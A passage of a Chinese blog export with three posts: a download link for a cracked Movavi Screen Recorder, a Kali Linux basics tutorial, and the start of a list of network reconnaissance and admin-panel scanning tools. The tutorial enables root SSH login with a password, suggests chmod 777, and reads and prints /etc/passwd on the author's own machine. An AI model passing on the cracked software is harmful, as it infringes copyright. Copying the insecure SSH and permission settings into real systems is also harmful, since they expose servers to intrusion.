      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>Movavi Screen Recorder v21.2.0汉化破解</title>
    <url>/2021/05/12/Movavi%20Screen%20Recorder%20v21.2.0%E6%B1%89%E5%8C%96%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr>
<h1 id="Movavi-Screen-Recorder-v21-2-0汉化破解"><a href="#Movavi-Screen-Recorder-v21-2-0汉化破解" class="headerlink" title="Movavi Screen Recorder v21.2.0汉化破解"></a>Movavi Screen Recorder v21.2.0汉化破解</h1><h2 id="蓝奏云下载："><a href="#蓝奏云下载：" class="headerlink" title="蓝奏云下载："></a>蓝奏云下载：</h2><p><a href="https://www.lanzoux.com/b00zntn7i" target="_blank" rel="noopener">蓝奏云</a></p>
<p><strong>提取码：g6g2</strong></p>
<h2 id="下载与使用教程图解"><a href="#下载与使用教程图解" class="headerlink" title="下载与使用教程图解"></a>下载与使用教程图解</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/96dd1791275c172d16e5136bf4ba40cb.png" alt="image-20210512171218406"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/899889abe32dabf6f1d2491d62e42a68.png" alt="image-20210512171319052"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/99acf16557b2872b3dac7217952e3e88.png" alt="image-20210512171408188"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3cffab7025f712163e4923c5c7758116.png" alt="image-20210512171434756"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f167c5990aa73bbb352d20480b87d639.png" alt="image-20210512171521469"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a53a344f6f4f033d382fa530febc1706.png" alt="image-20210512171622779"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3814a10fb50b83c9880db14b75f6447f.png" alt="image-20210512171707043"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/37a589473c93a271336d2b31bf5e0472.png" alt="image-20210512171757662"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bd288a856b40331c329928a8f62c1a34.png" alt="image-20210512171818371"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/95b1c68003b2617f0cf0e93d252e9fcd.png" alt="image-20210512172026082"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4cc417ee3f8f25752cf2e970bdfa710b.png" alt="image-20210512172048157"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/10b2efb3c04dbcb3a979ce1e6e5904ed.png" alt="image-20210512172250471"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4b45a2d1544002693f858361a61a7564.png" alt="image-20210512172236667"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c53dddcf25e79bff228ff66313d5f766.png" alt="image-20210512172128657"></p>
<h2 id="录屏方式"><a href="#录屏方式" class="headerlink" title="录屏方式"></a>录屏方式</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/fb04845abd438d6c16aea1030fb45268.png" alt="image-20210512172313338"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ecfb2f466f644a0dac2e51884cc3829d.png" alt="image-20210512172413522"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c16379014cae67118a6ead42f9dc89de.png" alt="image-20210512172728219"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fe94a25e2ac7b2b7bae0c5b358226242.png" alt="image-20210512172836725"></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>录屏</tag>
      </tags>
  </entry>
  <entry>
    <title>【kali linux】基础知识</title>
    <url>/2021/05/09/%E3%80%90kali%20linux%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="认识linux"><a href="#认识linux" class="headerlink" title="认识linux"></a>认识linux</h1><h2 id="SHELL和终端"><a href="#SHELL和终端" class="headerlink" title="SHELL和终端"></a>SHELL和终端</h2><blockquote>
<p>查看shells：  cat /etc/shells</p>
<p>查看当前shell   ：  echo $SHELL  linux区分大小写</p>
</blockquote>
<h2 id="vim编译器"><a href="#vim编译器" class="headerlink" title="vim编译器"></a><strong>vim编译器</strong></h2><blockquote>
<p>VM编辑器是所有unix及linux系统下标准的编辑器。</p>
</blockquote>
<p><strong>vi/vim编辑器模式</strong></p>
<blockquote>
<p><strong>命令模式</strong>：刚进入vim的时候，默认就是命令模式，可以复制行，删除行等。</p>
<p><strong>输入模式</strong>：可以输入内容</p>
<p>输入模式 -&gt; 命令模式  快键键 ESC键</p>
<p><strong>关闭、保存文件</strong><br><strong>冒号“：”开头</strong><br><strong>命令模式下</strong>：</p>
<p>w: 保存<br>q:退出<br>wq和x都是保存退出<br>q! :强制退出<br>w!: 强制保存，管理员才有权限</p>
<p><strong>例如      :q!</strong></p>
<p><strong>查找</strong><br>普通模式：<br>/PATTERN: 从当前位置向后查找<br>?PATTERN: 从当前位置向前查找</p>
<p><strong>模式转换</strong><br>使用insert键切换进输入模式<br><strong>命令模式 -&gt; 输入模式</strong>：</p>
<p><strong>i：在当前光标所在字符的前面，转换为输入模式</strong><br><strong>I：在当前光标所在行的行首转换为输入模式</strong><br><strong>a：在当前光标所在字符的后面，转换为输入模式</strong><br><strong>A：在当前光标所在行的行尾，转换为输入模式</strong><br><strong>o：在当前光标所在行的下方，新建一行，并转为输入模式</strong><br><strong>O：在当前光标所在行的上方，新建一行，并转为输入模式</strong><br><strong>s：删除光标所在字符</strong><br><strong>r：替换光标处字符</strong></p>
</blockquote>
<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><blockquote>
<p><strong>echo命令</strong>： echo $SHELL<br>echo命令用于在终端输出字符串或变量提取后的值</p>
<p><strong>date命令</strong><br>date命令用于显示及设置系统的时间或日期</p>
<p>poweroff命令<br>poweroff命令用于关闭系统</p>
<p>top命令<br>显示当前系统正在执行的进程的相关信息，包括进程id、内存占用率等</p>
</blockquote>
<h2 id="系统检测命令"><a href="#系统检测命令" class="headerlink" title="系统检测命令"></a>系统检测命令</h2><blockquote>
<p><strong>ifconfig命令</strong><br>ifconfig命令用于获取网卡配置与网络状态等信息</p>
<p>*<em>uname命令 *</em> : uname -a<br>uname命令用于查看系统内核与系统版本等信息</p>
<p><strong>who命令</strong><br>who用于查看当前登入主机的用户终端信息</p>
<p><strong>history命令</strong> : history<br>history命令用于显示历史执行过的命令</p>
</blockquote>
<h2 id="工作目录切换命令"><a href="#工作目录切换命令" class="headerlink" title="工作目录切换命令"></a>工作目录切换命令</h2><blockquote>
<p><strong>pwd命令</strong><br>pwd命令用于显示用户当前所处的工作目录</p>
<p><strong>cd命令</strong><br>cd命令用于切换工作路径</p>
<p><strong>ls命令</strong><br>ls命令用于显示目录中的文件信息</p>
</blockquote>
<h1 id="了解VMware网络基本配置"><a href="#了解VMware网络基本配置" class="headerlink" title="了解VMware网络基本配置"></a>了解VMware网络基本配置</h1><blockquote>
<p>briged（桥接模式）：虚拟机和主机好比在同一个网络环境下的两台电脑</p>
<p>Nat（网络地址转换模拟）：NAT模式虚拟机通过主机进行联网。</p>
<p>Host-Only（主机模式）：主机模式将虚拟机与外网隔开，只能让虚拟机和虚拟机之间联网</p>
</blockquote>
<h1 id="kali的更新"><a href="#kali的更新" class="headerlink" title="kali的更新"></a>kali的更新</h1><h2 id="系统源"><a href="#系统源" class="headerlink" title="系统源"></a>系统源</h2><p><strong>源配置（软件源）概念</strong>：源就是来源。就是你安装软件时，程序从哪里获取软件包（安装程序在你的机器上，但需要安装的东西却在软件源服务器上）。其实你可以把它称为<strong>软件仓库</strong>。安装软件时，就是从仓库里面调取数据放在你的机器上。</p>
<h2 id="Linux下载软件的两种方式："><a href="#Linux下载软件的两种方式：" class="headerlink" title="Linux下载软件的两种方式："></a>Linux下载软件的两种方式：</h2><blockquote>
<p>1、<strong>从源配置（软件源）所在服务器上通过特定命令获取JDK，Tomcat之类的软件包</strong></p>
<p>2、<strong>从官网上下载软件包</strong></p>
</blockquote>
<p><strong>第一次更新源的过程就相当于我们刚装好windows系统需要打补丁</strong></p>
<blockquote>
<p>1、查看当前系统中所有软件包状态<br>sudo dpkg –get-selections | more<br>可以找到metasploit-framework软件包名为”metasploit-framework”</p>
<p>2、给metasploit-framework锁定当前版本不更新<br>sudo apt-mark hold metasploit-framework</p>
<p>3、查看当前已锁定的软件包<br>sudo dpkg –get-selections | grep hold</p>
<p>4、取消软件保留设置<br>sudo apt-mark unhold metasploit-framework</p>
</blockquote>
<h2 id="配置kali系统更新源"><a href="#配置kali系统更新源" class="headerlink" title="配置kali系统更新源"></a>配置kali系统更新源</h2><blockquote>
<p>1、使用编译器打开系统源文本</p>
<p>leafpad /etc/apt/sources.list   </p>
</blockquote>
<blockquote>
<p>2、可以更改更新源</p>
<p>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
</blockquote>
<p><img src="https://i.loli.net/2021/05/10/MtPYLGax89qWcvB.png" alt="image-20210510074625331"></p>
<blockquote>
<p>3、使用更新命令</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">apt-get updata &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</span><br></pre></td></tr></table></figure></div>

<h2 id="kali系统更新后出现的问题"><a href="#kali系统更新后出现的问题" class="headerlink" title="kali系统更新后出现的问题"></a>kali系统更新后出现的问题</h2><p><strong>如果metasploit-framework无法启动</strong></p>
<p>进入<strong>cd  /usr/share/metasploit-framework</strong>目录下<br>使用命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gem install bundler</span><br><span class="line">gem update --system</span><br></pre></td></tr></table></figure></div>

<p>然后成功启动</p>
<h2 id="SSH服务简介"><a href="#SSH服务简介" class="headerlink" title="SSH服务简介"></a>SSH服务简介</h2><blockquote>
<p><strong>SHH是标准的网络协议，默认22号端口，采用密文的形式在网络中传输数据，相对于通过明文传输的telnet，更具有更高的安全性</strong></p>
<p><strong>SSH服务目前较可靠，专为远程登录服务器和其他网络服务提供安全性的协议</strong></p>
<p><strong>SSH提供了口令和密钥两种用户验证方式，这两者都是通过密文传输数据的。</strong></p>
<p><strong>SSH对我们主要的作用是：能够操作远程服务器系统</strong></p>
</blockquote>
<h2 id="kali配置SSH服务和windows配置SSH服务"><a href="#kali配置SSH服务和windows配置SSH服务" class="headerlink" title="kali配置SSH服务和windows配置SSH服务"></a><strong>kali配置SSH服务和windows配置SSH服务</strong></h2><blockquote>
<p><strong>1、使用编辑器打开ssh配置</strong></p>
<p><strong>leafpad /etc/ssh/sshd_config</strong></p>
<p><strong>搜索：</strong><br><strong>#PasswordAuthentication yes  去掉注释</strong><br><strong>#PermitRootLogin prohibit-password   去掉注释并改为PermitRootLogin yes</strong>  </p>
<p><strong>2、使用命令行模式开启SSH服务</strong><br><strong>service ssh start</strong></p>
<p><strong>3、查看服务开启状态</strong><br><strong>service ssh status</strong></p>
<p><strong>3、登陆测试</strong><br><strong>使用</strong></p>
<p><strong>xshell</strong>蓝奏云： <a href="https://wwr.lanzous.com/b0262213c" target="_blank" rel="noopener">https://wwr.lanzous.com/b0262213c</a> 密码:9hm1</p>
<p><strong>putty</strong>蓝奏云：[<a href="https://wwr.lanzous.com/ib2cio96gxi" target="_blank" rel="noopener">https://wwr.lanzous.com/ib2cio96gxi</a>   52pj</p>
<p>openssh使用windows自带命令窗口连接：<a href="https://www.mls-software.com/opensshd.html" target="_blank" rel="noopener">https://www.mls-software.com/opensshd.html</a></p>
<p><strong>使用方法</strong></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618100927656.png" alt="image-20210618100927656"></p>
<p><strong>等工具测试</strong></p>
<ul>
<li><p>windows配置ssh服务</p>
<ul>
<li><p>下载地址：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPowerShell%2FWin32-OpenSSH%2Freleases" target="_blank" rel="noopener">https://github.com/PowerShell/Win32-OpenSSH/releases</a> </p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618111728037.png" alt="image-20210618111728037"></p>
</li>
<li><p>安装SSH服务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618111751408.png" alt="image-20210618111751408"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618111807807.png" alt="image-20210618111807807"></p>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Kali工具包简介"><a href="#Kali工具包简介" class="headerlink" title="Kali工具包简介"></a>Kali工具包简介</h1><p>kali linux 含有可用于渗透测试的工具</p>
<blockquote>
<p>信息收集：这类工具主要用来帮助我们收集目标的网站架构、网站脚本语言、网站信息泄露</p>
<p>漏洞评估：这类工具可以扫描目标系统上的漏洞，扫描主机漏洞，系统漏洞</p>
<p>漏洞利用：这类工具可以利用在目标系统中发现的漏洞，让我们针对性的去利用攻击</p>
<p>Web应用：即与web应用有关的工具，关于web方面的扫描器、爆破等工具</p>
<p>密码攻击：提供在线密码破解或者是离线的密码破解工具给我们使用</p>
</blockquote>
<h1 id="Linux常用命令-1"><a href="#Linux常用命令-1" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="文本文件编辑命令"><a href="#文本文件编辑命令" class="headerlink" title="文本文件编辑命令"></a>文本文件编辑命令</h2><blockquote>
<p><strong>cat命令</strong><br>cat命令用于查看纯文本文件（内容较少的）</p>
<p><strong>more命令</strong><br>more命令用于查看纯文本文件（内容较多的）</p>
<p><strong>ls命令</strong><br>查看当前目录</p>
<p><strong>head命令</strong><br>head命令用于查看纯文本文档的前N行</p>
<p><strong>wc命令</strong><br>wc命令用于统计指定文本的行数、字数、字节数</p>
<p><strong>stat命令</strong>： stat nmap.txt<br>stat命令用于查看文件的具体存储信息和时间等信息</p>
<p><strong>touch命令</strong>： touch –help    touch -a 05011001 nmap.txt<br>touch命令用于创建空白文件或设置文件的时间</p>
<p><strong>mkdir命令</strong><br>mkdir命令用于创建空白的目录</p>
<p><strong>cp命令</strong><br>cp命令用于复制文件或目录</p>
<p><strong>mv命令</strong><br>mv命令用于移动文件或将文件重命名</p>
<p><strong>file命令</strong><br>file命令用于查看文件的类型</p>
<p><strong>tar命令</strong><br>tar命令用于对文件进行打包压缩或解压</p>
<p><strong>find命令</strong><br>find命令用于按照指定条件来查找文件</p>
<p><strong>rm命令</strong><br>用于删除文件或者文件夹，删除文件夹要用-r -f</p>
<p><strong>wget命令</strong>： wget <a href="http://linux.51yip.com/images/logo.png" target="_blank" rel="noopener">http://linux.51yip.com/images/logo.png</a><br>wget命令用于下载</p>
</blockquote>
<h2 id="文件管理权限命令"><a href="#文件管理权限命令" class="headerlink" title="文件管理权限命令"></a>文件管理权限命令</h2><blockquote>
<p><strong>chmod</strong></p>
<p>文件和目录的权限<br>linux中文件和目录的权限有所不同<br>文件的权限<br>r 可以读文件 数值为4<br>w 可以写文件  2<br>x  可以执行文件 1</p>
</blockquote>
<h1 id="用户-用户组"><a href="#用户-用户组" class="headerlink" title="用户/用户组"></a>用户/用户组</h1><blockquote>
<p>在Linux中，每个文件都是属于一个用户的，每一个用户都属于一个用户组</p>
<p>可以同时拥有N多个用户，和用户组</p>
</blockquote>
<h2 id="保存用户信息"><a href="#保存用户信息" class="headerlink" title="保存用户信息"></a>保存用户信息</h2><blockquote>
<p>用户信息：cat /etc/passwd</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;usr&#x2F;bin&#x2F;zsh</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:101:101:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:104:110:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">tss:x:105:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">strongswan:x:106:65534::&#x2F;var&#x2F;lib&#x2F;strongswan:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">ntp:x:107:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:108:114::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">redsocks:x:109:115::&#x2F;var&#x2F;run&#x2F;redsocks:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rwhod:x:110:65534::&#x2F;var&#x2F;spool&#x2F;rwho:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">iodine:x:111:65534::&#x2F;run&#x2F;iodine:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">miredo:x:112:65534::&#x2F;var&#x2F;run&#x2F;miredo:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_rpc:x:113:65534::&#x2F;run&#x2F;rpcbind:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:114:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:115:120::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rtkit:x:116:121:RealtimeKit,,,:&#x2F;proc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:117:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">statd:x:118:65534::&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">postgres:x:119:123:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash</span><br><span class="line">avahi:x:120:125:Avahi mDNS daemon,,,:&#x2F;run&#x2F;avahi-daemon:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">stunnel4:x:121:126::&#x2F;var&#x2F;run&#x2F;stunnel4:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">Debian-snmp:x:122:127::&#x2F;var&#x2F;lib&#x2F;snmp:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614090034157.png" alt=""></p>
<ul>
<li><p>用户划分 </p>
<ul>
<li>系统用户<ul>
<li>root</li>
</ul>
</li>
<li>普通用户<ul>
<li>用户所创建的用户</li>
</ul>
</li>
<li>虚拟用户<ul>
<li>软件所创建的虚拟用户</li>
</ul>
</li>
</ul>
</li>
<li><p>用户组信息：cat /etc/group</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">scanner:x:133:saned,kali</span><br><span class="line">saned:x:134:</span><br><span class="line">sambashare:x:135:</span><br><span class="line">inetsim:x:136:</span><br><span class="line">colord:x:137:</span><br><span class="line">geoclue:x:138:</span><br><span class="line">lightdm:x:139:</span><br><span class="line">kpadmins:x:140:</span><br><span class="line">kali:x:1000:</span><br><span class="line">kaboxer:x:141:kali,root</span><br><span class="line">systemd-coredump:x:999:</span><br><span class="line">beef-xss:x:142:</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614091754143.png" alt="image-20210614091754143"></p>
<ul>
<li><strong>id组名</strong> 查看组信息</li>
</ul>
</li>
</ul>
</blockquote>
<p>参考：<a href="https://blog.51cto.com/983836259/1634705" target="_blank" rel="noopener">https://blog.51cto.com/983836259/1634705</a></p>
<blockquote>
<ul>
<li><p>用户组</p>
<ul>
<li>文件所拥有者   ： 文件的创造者，谁创建的文件，谁就是文件的所有者</li>
<li>用户所在组      ： 当linux当前用户创建了一个文件后，则这个文件所属的组便是这个用户所在的组</li>
<li>其他组 ： 除了文件所有者以及所在组的用户外，系统其他的用户都是文件的其他组</li>
</ul>
</li>
<li><p>用户管理</p>
<ul>
<li><p>查看用户信息 ： cat /etc/passwd    </p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614093742007.png" alt="image-20210614093742007"></p>
</li>
<li><p>添加用户 </p>
<ul>
<li>useradd -m key  ——自动在home文件夹下创建key</li>
<li>useradd -g 组名 用户名 ——指定添加在某个组里面</li>
<li>passwd key ——修改key的新密码</li>
</ul>
</li>
<li><p>删除用户 userdel -r key或者不加-r  ——删除目录以及用户</p>
</li>
</ul>
</li>
<li><p>组管理</p>
<ul>
<li><p>查看用户组信息</p>
<ul>
<li><p>cat /etc/group</p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614094910000.png" alt="image-20210614094910000"></p>
</li>
</ul>
</li>
<li><p>查看用户组归属  —&gt; groups用户名</p>
</li>
<li><p>添加组</p>
<ul>
<li>usermod -G 组名 用户名</li>
<li>usermod -a -G 组名 用户名 -&gt;&gt; 追加到新组</li>
</ul>
</li>
<li><p>删除组 –&gt;&gt; groupdel -f 组名</p>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h1><blockquote>
<ul>
<li><p>权限划分</p>
<ul>
<li>r 表示读文件 数值为4</li>
<li>w 表示写文件 数值为2</li>
<li>x 表示执行文件 数值为1 </li>
</ul>
</li>
<li><p>查看权限 -&gt; 当前目录下 ls -l</p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614095935874.png" alt="image-20210614095935874"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614100242163.png" alt="image-20210614100242163"></p>
</li>
<li><p>设置权限</p>
<ul>
<li>chmod命令<ul>
<li>chmod 777 文件名 —&gt; 给当前文件设置为777权限</li>
<li>chmod -R 777 目录名  —&gt; 给当前目录递归权限为777</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="软件安装管理"><a href="#软件安装管理" class="headerlink" title="软件安装管理"></a>软件安装管理</h1><blockquote>
<ul>
<li>dpkg —-&gt; dpkg是Debian Package缩写，是一个Debian的命令行工具，它可以用来安装、删除、构建和管理Debian的软件包<ul>
<li>安装软件 dpkg -i xxx.deb</li>
<li>卸载软件<ul>
<li>dpkg -r xxx.deb  —&gt;删除软件包</li>
<li>dpkg -r –purge xxx.deb —&gt;连通配置文件一起删除</li>
</ul>
</li>
</ul>
</li>
<li>gdebi —&gt; gdebi是一个轻量级的deb安装工具，它能代替臃肿的ubuntu软件中心安装deb<ul>
<li>安装gdebi<ul>
<li>sudo apt-get update</li>
<li>sudo apt-get install gedbi</li>
</ul>
</li>
<li>安装软件 sudo gdebi sogoupinyin.deb 选择y即可</li>
<li>图形化安装</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="压缩命令"><a href="#压缩命令" class="headerlink" title="压缩命令"></a>压缩命令</h1><blockquote>
<ul>
<li><p>linux下常用压缩文件格式</p>
<ul>
<li>.zip</li>
<li>.gz</li>
<li>.bz2</li>
<li>.tar.gz</li>
<li>.tar.bz2</li>
</ul>
</li>
<li><p>tar命令</p>
<ul>
<li><p>打包命令 ： tar -czvf 打包之后的文件名 源文件名 e.g. tar -czvf 123.tar 123.txt</p>
</li>
<li><p>解压命令： tar -xzvf 指定解包文件<img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614125233290.png" alt="image-20210614125233290"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614130156032.png" alt="image-20210614130156032"></p>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="搜索命令"><a href="#搜索命令" class="headerlink" title="搜索命令"></a>搜索命令</h1><blockquote>
<ul>
<li>find命令 —&gt; find命令所查找的目录路径<ul>
<li>指定目录查找并输出内容 —&gt; find ./kali/ -print</li>
<li>指定目录以shell脚本运行输出 —&gt;  find ./etc -exec ls {} ;</li>
<li>分支主题</li>
</ul>
</li>
</ul>
</blockquote>
<p>欢迎来到我的博客<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali基础</tag>
      </tags>
  </entry>
  <entry>
    <title>网络攻防工具</title>
    <url>/2021/05/07/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息收集工具"><a href="#信息收集工具" class="headerlink" title="信息收集工具"></a>信息收集工具</h1><h2 id="1、局域网信息探测工具-gt-Softperfect-Network-Scanner"><a href="#1、局域网信息探测工具-gt-Softperfect-Network-Scanner" class="headerlink" title="1、局域网信息探测工具 - &gt; Softperfect Network Scanner"></a>1、局域网信息探测工具 - &gt; Softperfect Network Scanner</h2><blockquote>
<p><strong>支持平台： 到2008</strong></p>
</blockquote>
<h2 id="2、Whois查询方法"><a href="#2、Whois查询方法" class="headerlink" title="2、Whois查询方法"></a>2、Whois查询方法</h2><blockquote>
<p>网上查询：whois.chinaz.com</p>
<p>工具查询：whoistd（whoisThisDomain）<br>下载地址<a href="http://www.nirsoft.net/network_tools.html" target="_blank" rel="noopener">http://www.nirsoft.net/network_tools.html</a></p>
</blockquote>
<h2 id="3、网站后台扫描工具"><a href="#3、网站后台扫描工具" class="headerlink" title="3、网站后台扫描工具"></a>3、网站后台扫描工具</h2><blockquote>
<p>Wscan工具</p>
<p>御剑</p>
</blockquote>
